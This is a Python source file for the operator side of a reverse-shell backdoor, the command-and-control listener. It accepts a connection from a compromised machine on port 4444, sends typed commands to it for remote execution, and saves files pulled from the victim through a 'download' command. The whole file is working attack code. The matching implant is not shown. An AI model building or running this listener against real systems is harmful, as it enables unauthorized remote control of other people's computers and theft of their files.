import socket as s
import json
import os
import sys
import chardet
import shlex
#import subprocess
#subprocess.check_output()


class Listener:
    def __init__(self, ip, port):
        listener = s.socket(s.AF_INET, s.SOCK_STREAM)
        listener.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections ...")
        self.connection, address = listener.accept()
        print("[+] Got a connection" + str(address))

    def reliable_send(self, data):
        #encoding = chardet.detect(data)['encoding']
        json_data = json.dumps(data)
        self.connection.send(bytes(json_data.encode()))


    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024).decode()).strip()
                return json.loads(json_data)
            except ValueError:
                continue

    def exec_remotly(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_recv()
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write((bytes((content).encode())).strip())
            print("[+] Download successfull")
    def run(self):
        while True:
            command = input(">> ")
            command = shlex.split(command)
            #command = command.split(" ")
            result = self.exec_remotly(command)

            if command[0] == "download":
                self.write_file(command[1], result)

            print(result)


ip = input("Enter IP-address: ")
my_listener = Listener(f"{ip}", 4444)
my_listener.run()



